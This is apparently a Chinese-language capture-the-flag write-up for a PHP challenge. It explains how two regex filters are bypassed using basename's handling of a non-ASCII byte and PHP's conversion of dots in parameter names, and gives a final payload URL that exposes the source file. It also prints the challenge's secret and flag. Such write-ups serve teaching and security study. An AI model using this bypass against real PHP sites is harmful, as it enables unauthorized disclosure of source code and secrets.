#PHP

```php
 <?php
include 'utils.php';

if (isset($_POST['guess'])) {
    $guess = (string) $_POST['guess'];
    if ($guess === $secret) {
        $message = 'Congratulations! The flag is: ' . $flag;
    } else {
        $message = 'Wrong. Try Again';
    }
}

if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("hacker :)");
}

if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
    exit("hacker :)");
}

if (isset($_GET['show_source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
    exit();
}else{
    show_source(__FILE__);
}
?>
```

开始的 `$secret` 无从得知

`$_SERVER` : `$_SERVER`  是一个包含了诸如头信息（header）、路径（path）、以及脚本位置（script locations）等信息的  array。
`PHP_SELF` : 当前执行脚本的文件名
`REQUEST_URI` : URI 用来指定要访问的页面。例如 “`/index.html`”
详见 [PHP: $\_SERVER - Manual](https://www.php.net/manual/zh/reserved.variables.server.php)

basename — 返回路径中的文件名部分
详见 [PHP: basename - Manual](https://www.php.net/manual/zh/function.basename.php)

第一个正则 : 匹配 `utils.php/` 后面加任意字符，用非 ASCII 字符绕过
第二个正则 : 匹配 `show_source` 可以考虑用 加号（`+`） 左中括号（`[`） 空格（` `） 点号（`.`）绕过

因为原本页面时`index.php`

所以最终 payload：

```url
index.php/utils.php/%ff?show.source=1
```

```php
`<?php
$secret = "nssctfrtdfgvhbjdas";
$flag = 'NSSCTF{70cead77-6ae5-4e6e-b998-afce675a92ac}';   `
```

参考链接：
[[鹤城杯 2021]EasyP\_偶尔躲躲乌云 334 的博客-CSDN 博客](https://blog.csdn.net/qq_62046696/article/details/124749646)
